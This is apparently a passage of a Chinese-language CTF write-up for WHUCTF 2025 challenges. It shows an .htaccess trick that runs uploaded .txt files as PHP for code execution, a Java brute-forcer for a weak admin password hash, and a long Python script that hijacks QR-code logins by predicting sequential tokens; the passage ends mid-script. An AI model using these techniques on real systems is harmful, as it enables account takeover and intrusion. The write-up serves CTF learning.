<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.txt&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>意思是把txt文件当php文件解析</p>
<p>然后我们需要访问域名uploaderrr.com,进行文件上传，将我们的木马和配置文件传上去。</p>
<p>但由于uploaderrr.com具有AllowOverride None，无法覆盖.htaccess，因此无法通过这个域名访问1.txt来rce。</p>
<p>但whuctf2025.com有<code>AllowOverride All</code>：允许使用 <code>.htaccess</code> 文件覆盖配置</p>
<p>因此访问whuctf2025.com,路由为&#x2F;uploads&#x2F;1.txt,即可rce。</p>
<p>payload如下（由于本人用的bp比较麻烦，这里用下kuri的脚本）：</p>
<p><img src="https://lunereal.1kal0vic.top/images/img/2025whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/1.png" alt="1" loading="lazy"></p>
<p>用bp或者yakit也可以，不过就是要切来切去比较麻烦（本人就是这样的</p>
<h3 id="3-Div2-Guild"><a href="#3-Div2-Guild" class="headerlink" title="[3-Div2]Guild"></a>[3-Div2]Guild</h3><p>kuri为了让小登放松一下熬夜出的题，伟大kuri。</p>
<p>用kuri发的工具把代码反汇编，然后将文件都给ai分析。</p>
<p><a target="_blank" rel="noopener" href="https://chat.deepseek.com/share/ibe377retoay826bws">https://chat.deepseek.com/share/ibe377retoay826bws</a></p>
<p>可知访问&#x2F;secret_r0uter可以获得admin的密码编码值。</p>
<p>然后再让ai写个爆破脚本就好。</p>
<p>脚本如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">public class PasswordCracker &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        int targetHash = 54362;</span><br><span class="line">        boolean found = false;</span><br><span class="line">        </span><br><span class="line">        System.out.println(&quot;Starting password crack...&quot;);</span><br><span class="line">        System.out.println(&quot;Target hash value: &quot; + targetHash);</span><br><span class="line">        System.out.println(&quot;=================================&quot;);</span><br><span class="line">        </span><br><span class="line">        // First try some common passwords</span><br><span class="line">        String[] commonPasswords = &#123;&quot;admin&quot;, &quot;password&quot;, &quot;123456&quot;, &quot;12345678&quot;, &quot;1234&quot;, </span><br><span class="line">                                   &quot;12345&quot;, &quot;000000&quot;, &quot;111111&quot;, &quot;54362&quot;, &quot;admin123&quot;&#125;;</span><br><span class="line">        </span><br><span class="line">        System.out.println(&quot;Trying common passwords...&quot;);</span><br><span class="line">        for (String pwd : commonPasswords) &#123;</span><br><span class="line">            int hash = pwd.hashCode() % 65536;</span><br><span class="line">            if (hash == targetHash) &#123;</span><br><span class="line">                System.out.println(&quot;FOUND PASSWORD: &quot; + pwd);</span><br><span class="line">                found = true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        if (!found) &#123;</span><br><span class="line">            System.out.println(&quot;Starting numeric brute force...&quot;);</span><br><span class="line">            for (int i = 0; i &lt; 10000000; i++) &#123;</span><br><span class="line">                String password = String.valueOf(i);</span><br><span class="line">                int hash = password.hashCode() % 65536;</span><br><span class="line">                </span><br><span class="line">                if (hash == targetHash) &#123;</span><br><span class="line">                    System.out.println(&quot;FOUND PASSWORD: &quot; + password);</span><br><span class="line">                    found = true;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                // Progress display</span><br><span class="line">                if (i == 100000) System.out.println(&quot;  Tried 100k...&quot;);</span><br><span class="line">                if (i == 500000) System.out.println(&quot;  Tried 500k...&quot;);</span><br><span class="line">                if (i == 1000000) System.out.println(&quot;  Tried 1 million...&quot;);</span><br><span class="line">                if (i == 5000000) System.out.println(&quot;  Tried 5 million...&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        System.out.println(&quot;=================================&quot;);</span><br><span class="line">        if (found) &#123;</span><br><span class="line">            System.out.println(&quot;SUCCESS! Use username &#x27;admin&#x27; and the found password to login&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            System.out.println(&quot;FAILED: No matching password found in first 10 million numbers&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在cmd中编译运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac PasswordCracker.java</span><br><span class="line">java PasswordCracker</span><br></pre></td></tr></table></figure>

<p>得到密码后登陆即可。</p>
<p>flag在后台html的注释里面。</p>
<h3 id="1-Div1-ZakoLogin"><a href="#1-Div1-ZakoLogin" class="headerlink" title="[1-Div1]ZakoLogin"></a>[1-Div1]ZakoLogin</h3><p>先代码审计</p>
<p><a target="_blank" rel="noopener" href="https://chat.deepseek.com/share/xv68423hevqn02bt22">https://chat.deepseek.com/share/xv68423hevqn02bt22</a></p>
<p>(肯定ai来审计了啦)</p>
<p>关键提示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">后台有个模拟的人每隔一段时间会扫一次码，浏览器是轮询，因此我们可以抢着轮询的时间去劫持，提前完成认证</span><br></pre></td></tr></table></figure>

<p>之前我一直想不通该怎么弄，原来是有点类似于会话劫持，我们盗用了后台扫码成功的人的身份。</p>
<p>具体漏洞成因在于生成的token是固定的，因此可以预测，然后轮询的时间不够短。</p>
<p>所以我们可以通过自己的token猜到别人的token，从而盗用身份。</p>
<p>开始攻击。</p>
<p>首先获得token列表。</p>
<p>往&#x2F;login&#x2F;qrcode&#x2F;get连续发包，获得token列表。</p>
<p>将token列表保存到txt文件，然后重启容器，攻击的py脚本如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line">import os</span><br><span class="line">from typing import List, Optional</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class TokenHijackAttack:</span><br><span class="line">    def __init__(self, base_url: str = &quot;http://127.0.0.1:64276&quot;):</span><br><span class="line">        # 确保base_url包含协议</span><br><span class="line">        if not base_url.startswith(&#x27;http&#x27;):</span><br><span class="line">            base_url = &#x27;http://&#x27; + base_url</span><br><span class="line">        self.base_url = base_url</span><br><span class="line"></span><br><span class="line">        self.token_list: List[str] = []</span><br><span class="line">        self.current_index: int = 0</span><br><span class="line">        self.is_attacking: bool = False</span><br><span class="line">        self.hijacked_token: Optional[str] = None</span><br><span class="line">        self.monitor_thread: Optional[threading.Thread] = None</span><br><span class="line">        self.session = requests.Session()</span><br><span class="line"></span><br><span class="line">        self.session.headers.update(&#123;</span><br><span class="line">            &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#x27;,</span><br><span class="line">            &#x27;Accept&#x27;: &#x27;application/json, text/plain, */*&#x27;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    def load_token_list(self, filename: str) -&gt; bool:</span><br><span class="line">        &quot;&quot;&quot;从文件加载token列表 - 适配16位token&quot;&quot;&quot;</span><br><span class="line">        try:</span><br><span class="line">            if not os.path.exists(filename):</span><br><span class="line">                print(f&quot;[ERROR] 文件 &#123;filename&#125; 不存在&quot;)</span><br><span class="line">                return False</span><br><span class="line"></span><br><span class="line">            tokens = []</span><br><span class="line">            with open(filename, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">                for line_num, line in enumerate(f, 1):</span><br><span class="line">                    line = line.strip()</span><br><span class="line">                    if not line:</span><br><span class="line">                        continue</span><br><span class="line"></span><br><span class="line">                    # 处理16位token（你提供的样本是16位）</span><br><span class="line">                    token = line.strip()</span><br><span class="line">                    if len(token) == 16 and all(c in &#x27;0123456789abcdef&#x27; for c in token):</span><br><span class="line">                        tokens.append(token)</span><br><span class="line">                    elif len(token) == 32:</span><br><span class="line">                        # 如果是32位，取前16位（根据服务器响应格式）</span><br><span class="line">                        tokens.append(token[:16])</span><br><span class="line">                    else:</span><br><span class="line">                        print(f&quot;[WARNING] 第&#123;line_num&#125;行格式异常: &#123;line&#125;&quot;)</span><br><span class="line"></span><br><span class="line">            self.token_list = tokens</span><br><span class="line">            print(f&quot;[INFO] 成功加载了 &#123;len(self.token_list)&#125; 个token&quot;)</span><br><span class="line"></span><br><span class="line">            if self.token_list:</span><br><span class="line">                print(&quot;[INFO] 前5个token:&quot;)</span><br><span class="line">                for i, token in enumerate(self.token_list[:5]):</span><br><span class="line">                    print(f&quot;  &#123;i + 1&#125;. &#123;token&#125;&quot;)</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;[ERROR] 没有找到有效的token&quot;)</span><br><span class="line">                return False</span><br><span class="line"></span><br><span class="line">            return True</span><br><span class="line"></span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(f&quot;[ERROR] 加载token文件失败: &#123;e&#125;&quot;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def load_hardcoded_tokens(self):</span><br><span class="line">        &quot;&quot;&quot;使用硬编码的16位token&quot;&quot;&quot;</span><br><span class="line">        hardcoded_tokens = [</span><br><span class="line">            &quot;eccbc87e4b5ce2fe&quot;,  # 你提供的第一个token</span><br><span class="line">            &quot;a87ff679a2f3e71d&quot;,</span><br><span class="line">            &quot;e4da3b7fbbce2345&quot;,</span><br><span class="line">            &quot;1679091c5a880faf&quot;,</span><br><span class="line">            &quot;8f14e45fceea167a&quot;,</span><br><span class="line">            &quot;c9f0f895fb98ab91&quot;,</span><br><span class="line">            &quot;d3d9446802a44259&quot;,</span><br><span class="line">            &quot;45c48cce2e2d7fbd&quot;,</span><br><span class="line">            &quot;c20ad4d76fe97759&quot;,</span><br><span class="line">            &quot;6512bd43d9caa6e0&quot;,</span><br><span class="line">            &quot;c51ce410c124a10e&quot;,</span><br><span class="line">            &quot;aab3238922bcc25a&quot;,</span><br><span class="line">            &quot;9bf31c7ff062936a&quot;,</span><br><span class="line">            &quot;c74d97b01eae257e&quot;,</span><br><span class="line">            &quot;70efdf2ec9b08607&quot;</span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        self.token_list = hardcoded_tokens</span><br><span class="line">        print(f&quot;[INFO] 使用硬编码token，共 &#123;len(self.token_list)&#125; 个&quot;)</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">    def get_current_server_token(self) -&gt; Optional[str]:</span><br><span class="line">        &quot;&quot;&quot;获取服务器当前token&quot;&quot;&quot;</span><br><span class="line">        try:</span><br><span class="line">            url = f&quot;&#123;self.base_url&#125;/login/qrcode/get&quot;</span><br><span class="line">            print(f&quot;[DEBUG] 请求URL: &#123;url&#125;&quot;)</span><br><span class="line"></span><br><span class="line">            response = self.session.get(url, timeout=5)</span><br><span class="line"></span><br><span class="line">            if response.status_code == 200:</span><br><span class="line">                data = response.json()</span><br><span class="line">                token = data.get(&#x27;token&#x27;)</span><br><span class="line">                print(f&quot;[INFO] 获取到服务器当前token: &#123;token&#125;&quot;)</span><br><span class="line">                print(f&quot;[INFO] token长度: &#123;len(token)&#125;&quot;)</span><br><span class="line">                return token</span><br><span class="line">            else:</span><br><span class="line">                print(f&quot;[ERROR] 获取token失败，状态码: &#123;response.status_code&#125;&quot;)</span><br><span class="line">                print(f&quot;[DEBUG] 响应内容: &#123;response.text&#125;&quot;)</span><br><span class="line">                return None</span><br><span class="line"></span><br><span class="line">        except requests.RequestException as e:</span><br><span class="line">            print(f&quot;[ERROR] 获取服务器token失败: &#123;e&#125;&quot;)</span><br><span class="line">            return None</span><br><span class="line"></span><br><span class="line">    def check_token_status(self, token: str) -&gt; Optional[dict]:</span><br><span class="line">        &quot;&quot;&quot;检查token状态&quot;&quot;&quot;</span><br><span class="line">        try:</span><br><span class="line">            url = f&quot;&#123;self.base_url&#125;/login/qrcode/check?token=&#123;token&#125;&quot;</span><br><span class="line">            response = self.session.get(url, timeout=5)</span><br><span class="line"></span><br><span class="line">            if response.status_code == 200:</span><br><span class="line">                data = response.json()</span><br><span class="line">                print(f&quot;[DEBUG] Token &#123;token&#125; 状态: &#123;data&#125;&quot;)</span><br><span class="line">                return data</span><br><span class="line">            else:</span><br><span class="line">                print(f&quot;[ERROR] 检查token状态失败，状态码: &#123;response.status_code&#125;&quot;)</span><br><span class="line">                return None</span><br><span class="line"></span><br><span class="line">        except requests.RequestException as e:</span><br><span class="line">            print(f&quot;[ERROR] 检查token状态失败: &#123;e&#125;&quot;)</span><br><span class="line">            return None</span><br><span class="line"></span><br><span class="line">    def find_token_position(self, current_token: str) -&gt; int:</span><br><span class="line">        &quot;&quot;&quot;找到当前token在列表中的位置&quot;&quot;&quot;</span><br><span class="line">        # 完整匹配</span><br><span class="line">        if current_token in self.token_list:</span><br><span class="line">            idx = self.token_list.index(current_token)</span><br><span class="line">            print(f&quot;[INFO] 找到完全匹配，位置: &#123;idx&#125;&quot;)</span><br><span class="line">            return idx</span><br><span class="line"></span><br><span class="line">        # 处理可能的格式差异</span><br><span class="line">        for i, token in enumerate(self.token_list):</span><br><span class="line">            if token in current_token or current_token in token:</span><br><span class="line">                print(f&quot;[INFO] 使用部分匹配找到token位置: &#123;i&#125;&quot;)</span><br><span class="line">                return i</span><br><span class="line"></span><br><span class="line">        print(f&quot;[ERROR] 无法找到token位置: &#123;current_token&#125;&quot;)</span><br><span class="line">        print(f&quot;[DEBUG] 前5个列表token: &#123;self.token_list[:5]&#125;&quot;)</span><br><span class="line">        return -1</span><br><span class="line"></span><br><span class="line">    def monitor_next_token(self, target_token: str):</span><br><span class="line">        &quot;&quot;&quot;监控下一个token的状态&quot;&quot;&quot;</span><br><span class="line">        print(f&quot;[INFO] 开始高频监控token: &#123;target_token&#125;&quot;)</span><br><span class="line">        print(f&quot;[INFO] 监控URL: &#123;self.base_url&#125;/login/qrcode/check?token=&#123;target_token&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        check_count = 0</span><br><span class="line">        last_status = None</span><br><span class="line"></span><br><span class="line">        while self.is_attacking and check_count &lt; 1000:</span><br><span class="line">            try:</span><br><span class="line">                status = self.check_token_status(target_token)</span><br><span class="line">                check_count += 1</span><br><span class="line"></span><br><span class="line">                if status:</span><br><span class="line">                    code = status.get(&#x27;code&#x27;)</span><br><span class="line"></span><br><span class="line">                    # 只在状态变化时打印</span><br><span class="line">                    if code != last_status:</span><br><span class="line">                        print(f&quot;[MONITOR] 第&#123;check_count&#125;次检查 - 状态变化: code=&#123;code&#125;&quot;)</span><br><span class="line">                        last_status = code</span><br><span class="line"></span><br><span class="line">                    # 状态码说明（根据你的代码）:</span><br><span class="line">                    # 0: 等待中, 1: 登录成功, 2: 已扫码, 3: 已过期</span><br><span class="line"></span><br><span class="line">                    if code == 2:</span><br><span class="line">                        print(f&quot;[SUCCESS] 🎯 Token 已被扫码！等待用户确认...&quot;)</span><br><span class="line"></span><br><span class="line">                    if code == 1:</span><br><span class="line">                        session_token = status.get(&#x27;token&#x27;)</span><br><span class="line">                        print(f&quot;[VICTORY] 🎉 登录成功！&quot;)</span><br><span class="line">                        print(f&quot;[VICTORY] 获得会话Token: &#123;session_token&#125;&quot;)</span><br><span class="line">                        self.hijacked_token = session_token</span><br><span class="line">                        self.is_attacking = False</span><br><span class="line">                        self.access_backend(session_token)</span><br><span class="line">                        return</span><br><span class="line"></span><br><span class="line">                    if code == 3:</span><br><span class="line">                        print(f&quot;[INFO] Token 已过期，停止监控&quot;)</span><br><span class="line">                        self.is_attacking = False</span><br><span class="line">                        return</span><br><span class="line"></span><br><span class="line">                # 高频轮询</span><br><span class="line">                time.sleep(0.3)</span><br><span class="line"></span><br><span class="line">            except Exception as e:</span><br><span class="line">                print(f&quot;[ERROR] 监控过程中出错: &#123;e&#125;&quot;)</span><br><span class="line">                time.sleep(1)</span><br><span class="line"></span><br><span class="line">        print(f&quot;[INFO] 监控结束，共检查 &#123;check_count&#125; 次&quot;)</span><br><span class="line"></span><br><span class="line">    def access_backend(self, session_token: str):</span><br><span class="line">        &quot;&quot;&quot;使用劫持的token访问后台&quot;&quot;&quot;</span><br><span class="line">        print(f&quot;[BACKEND] 使用会话token访问后台...&quot;)</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            # 尝试访问后台页面</span><br><span class="line">            urls_to_try = [</span><br><span class="line">                f&quot;&#123;self.base_url&#125;/zakofl4g?token=&#123;session_token&#125;&quot;,</span><br><span class="line">                f&quot;&#123;self.base_url&#125;/admin?token=&#123;session_token&#125;&quot;,</span><br><span class="line">                f&quot;&#123;self.base_url&#125;/flag?token=&#123;session_token&#125;&quot;,</span><br><span class="line">                f&quot;&#123;self.base_url&#125;/dashboard?token=&#123;session_token&#125;&quot;,</span><br><span class="line">                f&quot;&#123;self.base_url&#125;/&quot;,</span><br><span class="line">            ]</span><br><span class="line"></span><br><span class="line">            for url in urls_to_try:</span><br><span class="line">                print(f&quot;[BACKEND] 尝试访问: &#123;url&#125;&quot;)</span><br><span class="line">                response = self.session.get(url, timeout=10)</span><br><span class="line"></span><br><span class="line">                print(f&quot;[BACKEND] 响应状态码: &#123;response.status_code&#125;&quot;)</span><br><span class="line"></span><br><span class="line">                if response.status_code == 200:</span><br><span class="line">                    # 保存响应内容</span><br><span class="line">                    filename = f&quot;hijacked_response_&#123;int(time.time())&#125;.html&quot;</span><br><span class="line">                    with open(filename, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">                        f.write(response.text)</span><br><span class="line"></span><br><span class="line">                    print(f&quot;[BACKEND] 响应已保存到: &#123;filename&#125;&quot;)</span><br><span class="line">                    print(f&quot;[BACKEND] 响应长度: &#123;len(response.text)&#125; 字符&quot;)</span><br><span class="line"></span><br><span class="line">                    # 显示响应前500字符</span><br><span class="line">                    preview = response.text[:500]</span><br><span class="line">                    print(f&quot;[BACKEND] 响应预览:\n&#123;preview&#125;&quot;)</span><br><span class="line"></span><br><span class="line">                    # 检查flag</span><br><span class="line">                    if &#x27;flag&#x27; in response.text.lower() or &#x27;FLAG&#x27; in response.text:</span><br><span class="line">                        print(&quot;[FLAG] 🚩 发现flag相关关键词！&quot;)</span><br><span class="line">                        import re</span><br><span class="line">                        flags = re.findall(r&#x27;flag\&#123;[^&#125;]+\&#125;|FLAG\&#123;[^&#125;]+\&#125;|ctf\&#123;[^&#125;]+\&#125;|CTF\&#123;[^&#125;]+\&#125;&#x27;, response.text)</span><br><span class="line">                        if flags:</span><br><span class="line">                            for flag in flags:</span><br><span class="line">                                print(f&quot;🎯 发现FLAG: &#123;flag&#125;&quot;)</span><br><span class="line">                        else:</span><br><span class="line">                            # 如果没有标准格式，显示相关行</span><br><span class="line">                            for line in response.text.split(&#x27;\n&#x27;):</span><br><span class="line">                                if &#x27;flag&#x27; in line.lower():</span><br><span class="line">                                    print(f&quot;🔍 Flag相关行: &#123;line.strip()&#125;&quot;)</span><br><span class="line"></span><br><span class="line">                    break</span><br><span class="line">                else:</span><br><span class="line">                    print(f&quot;[BACKEND] 访问失败，状态码: &#123;response.status_code&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(f&quot;[ERROR] 访问后台失败: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    def start_attack(self):</span><br><span class="line">        &quot;&quot;&quot;开始攻击&quot;&quot;&quot;</span><br><span class="line">        if not self.token_list:</span><br><span class="line">            print(&quot;[ERROR] token列表为空&quot;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">        print(&quot;[INFO] 开始Token劫持攻击...&quot;)</span><br><span class="line"></span><br><span class="line">        # 获取服务器当前token</span><br><span class="line">        current_token = self.get_current_server_token()</span><br><span class="line">        if not current_token:</span><br><span class="line">            print(&quot;[ERROR] 无法获取服务器当前token&quot;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">        # 找到在列表中的位置</span><br><span class="line">        self.current_index = self.find_token_position(current_token)</span><br><span class="line">        if self.current_index == -1:</span><br><span class="line">            print(&quot;[ERROR] 当前token不在已知列表中&quot;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">        print(f&quot;[INFO] 当前token位置: 第&#123;self.current_index + 1&#125;个&quot;)</span><br><span class="line"></span><br><span class="line">        # 计算下一个token</span><br><span class="line">        next_token_index = self.current_index + 1</span><br><span class="line">        if next_token_index &gt;= len(self.token_list):</span><br><span class="line">            print(&quot;[ERROR] 已到达token列表末尾&quot;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">        next_token = self.token_list[next_token_index]</span><br><span class="line">        